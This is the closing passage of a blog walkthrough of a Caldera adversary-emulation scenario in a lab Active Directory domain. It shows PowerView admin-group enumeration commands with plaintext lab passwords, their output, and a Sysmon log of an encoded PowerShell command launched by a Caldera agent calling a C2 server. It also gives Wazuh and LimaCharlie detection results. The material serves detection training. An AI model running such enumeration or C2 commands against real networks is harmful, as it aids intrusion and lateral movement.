+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;$backup = &#34;get_admin&#34;;$userName = &#34;ssnrshnn.local\goadmin&#34;;$secStringPassword = ConvertTo-SecureString &#34;Test123!&#34; -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName client2.ssnrshnn.local -Credential $credObject
+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;$backup = &#34;get_admin&#34;;$userName = &#34;ssnrshnn.local\goadmin&#34;;$secStringPassword = ConvertTo-SecureString &#34;Test123!&#34; -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName client1.ssnrshnn.local -Credential $credObject
+</code></pre><pre tabindex=0><code>Import-Module .\powerview.ps1;$backup = &#34;get_admin&#34;;$userName = &#34;ssnrshnn.local\goadmin&#34;;$userPassword = &#34;Soner.o1&#34;;$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName ad-dc.ssnrshnn.local -Credential $credObject
+</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : EXCHANGE\Administrator
+SID          : S-1-5-21-1945855000-140921441-2322798616-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Organization Management
+SID          : S-1-5-21-2105100566-3451255-233295498-1111
+IsGroup      : True
+IsDomain     : True
+
+ComputerName : exchange.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Exchange Trusted Subsystem
+SID          : S-1-5-21-2105100566-3451255-233295498-1126
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT2\Administrator
+SID          : S-1-5-21-1149899384-3851703988-751053742-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT2\client2
+SID          : S-1-5-21-1149899384-3851703988-751053742-1001
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client2.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT1\Administrator
+SID          : S-1-5-21-4174197286-1528992158-1233857966-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : CLIENT1\client1
+SID          : S-1-5-21-4174197286-1528992158-1233857966-1001
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : client1.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : True
+</code></pre><pre tabindex=0><code>ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Administrator
+SID          : S-1-5-21-2105100566-3451255-233295498-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Enterprise Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-519
+IsGroup      : True
+IsDomain     : False
+
+ComputerName : ad-dc.ssnrshnn.local
+GroupName    : Administrators
+MemberName   : SSNRSHNN\Domain Admins
+SID          : S-1-5-21-2105100566-3451255-233295498-512
+IsGroup      : True
+IsDomain     : False
+</code></pre><p><strong>LimaCharlie:</strong></p><p><strong>First Process:</strong></p><p><img src=/images/calderaalice/54.png alt=alice></p><p><strong>Process Tree:</strong></p><p><img src=/images/calderaalice/55.png alt=alice></p><p><strong>LimaCharlie Detection:</strong></p><p><img src=/images/calderaalice/56.png alt=alice></p><p><strong>Detection Rules that are matched with relevant processes:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p><img src=/images/calderaalice/57.png alt=alice></p><p><img src=/images/calderaalice/58.png alt=alice></p><p><strong>Sysmon Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:31:13.592
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a361-68db-2e05-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 3000
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc SQBtAHAAbwByAHQALQBNAG<span style=color:#bd93f9>8</span>AZAB<span style=color:#bd93f9>1</span>AGwAZQAgAC<span style=color:#bd93f9>4</span>AXABwAG<span style=color:#bd93f9>8</span>AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD<span style=color:#bd93f9>0</span>AIAAiAGcAZQB<span style=color:#bd93f9>0</span>AF<span style=color:#bd93f9>8</span>AYQBkAG<span style=color:#bd93f9>0</span>AaQBuACIAOwAkAHUAcwBlAHIATgBhAG<span style=color:#bd93f9>0</span>AZQAgAD<span style=color:#bd93f9>0</span>AIAAiAHMAcwBuAHIAcwBoAG<span style=color:#bd93f9>4</span>AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG<span style=color:#bd93f9>4</span>AIgA<span style=color:#bd93f9>7</span>ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA<span style=color:#bd93f9>9</span>ACAAIgBTAG<span style=color:#bd93f9>8</span>AbgBlAHIALgBvADEAIgA<span style=color:#bd93f9>7</span>ACQAcwBlAGMAUwB<span style=color:#bd93f9>0</span>AHIAaQBuAGcAUABhAHMAcwB<span style=color:#bd93f9>3</span>AG<span style=color:#bd93f9>8</span>AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC<span style=color:#bd93f9>0</span>AUwBlAGMAdQByAGUAUwB<span style=color:#bd93f9>0</span>AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB<span style=color:#bd93f9>3</span>AG<span style=color:#bd93f9>8</span>AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB<span style=color:#bd93f9>4</span>AHQAIAAtAEYAbwByAGMAZQA<span style=color:#bd93f9>7</span>ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD<span style=color:#bd93f9>0</span>AIABOAGUAdwAtAE<span style=color:#bd93f9>8</span>AYgBqAGUAYwB<span style=color:#bd93f9>0</span>ACAAUwB<span style=color:#bd93f9>5</span>AHMAdABlAG<span style=color:#bd93f9>0</span>ALgBNAGEAbgBhAGcAZQBtAGUAbgB<span style=color:#bd93f9>0</span>AC<span style=color:#bd93f9>4</span>AQQB<span style=color:#bd93f9>1</span>AHQAbwBtAGEAdABpAG<span style=color:#bd93f9>8</span>AbgAuAFAAUwBDAHIAZQBkAGUAbgB<span style=color:#bd93f9>0</span>AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG<span style=color:#bd93f9>0</span>AZQAsACAAJABzAGUAYwBTAHQAcgBpAG<span style=color:#bd93f9>4</span>AZwBQAGEAcwBzAHcAbwByAGQAKQA<span style=color:#bd93f9>7</span>AEcAZQB<span style=color:#bd93f9>0</span>AC<span style=color:#bd93f9>0</span>ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC<span style=color:#bd93f9>0</span>AQwBvAG<span style=color:#bd93f9>0</span>AcAB<span style=color:#bd93f9>1</span>AHQAZQByAE<span style=color:#bd93f9>4</span>AYQBtAGUAIABlAHgAYwBoAGEAbgBnAGUALgBzAHMAbgByAHMAaABuAG<span style=color:#bd93f9>4</span>ALgBsAG<span style=color:#bd93f9>8</span>AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><p>That&rsquo;s the end of the attack scenario.</p><p>Of course, LimaCharlie, Wazuh, and Suricata offer far more capabilities than shown here. In this scenario, I aimed to show you the basics of investigation.</p><p>Thank you for taking the time to read this article. I hope you&rsquo;ll find it useful.</p><p>Keep up the good work!</p></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/tools/>Tools</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#step-1---discover-local-hosts>Step 1 - Discover local hosts:</a></li><li><a href=#step-2---find-domain>Step 2 - Find Domain:</a></li><li><a href=#step-3---discover-admins>Step 3 - Discover Admins:</a></li><li><a href=#step-4---powercatz>Step 4 - Powercatz:</a></li><li><a href=#step-5---remote-host-ping>Step 5 - Remote Host Ping:</a></li><li><a href=#step-6---account-type-admin-enumeration>Step 6 - Account-type Admin Enumeration:</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&text=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&is_video=false&description=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation&body=Check out this article: https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&title=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&name=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation&description=%3cp%3eI%20will%20perform%20an%20attack%20scenario%20using%20Caldera%20and%20will%20show%20its%20effects%20in%20Wazuh%20%28SIEM%2fXDR%29%20and%20LimaCharlie%20%28EDR%29.%3c%2fp%3e%0a%3cp%3eLimaCharlie%20can%20integrate%20with%20the%20Atomic%20Red%20Team%20extension%2c%20which%20I%20will%20use%20in%20Caldera%20to%20perform%20the%20attack.%20Therefore%2c%20you%20don%26rsquo%3bt%20need%20to%20install%20Atomic%20Red%20Team%20separately.%3c%2fp%3e%0a%3cp%3eIn%20my%20lab%20environment%20for%20this%20attack%20scenario%2c%20I%20have%20a%20Client1%20machine%20and%20an%20AD-DC%20machine%2c%20and%20I%20have%20already%20installed%20Caldera%20agents%20on%20both.%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fittechnetworkk.github.io%2fposts%2fcaldera_alice2.0_attack_scenario%2fcalderaalice2.0%2f&t=%5bEN%5d%20Caldera%20Alice%202.0%20Adversary%20Emulation" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
+<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
+<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
+<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025 ittechnetworkk</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/walkthroughs>Walkthroughs</a></li><li><a href=/projects>Projects</a></li><li><a href=/tools/>Tools</a></li><li><a href=/resources>Resources</a></li><li><a href=/library>Library</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/lightbox.js></script><script src=/js/code-copy.js></script></html>
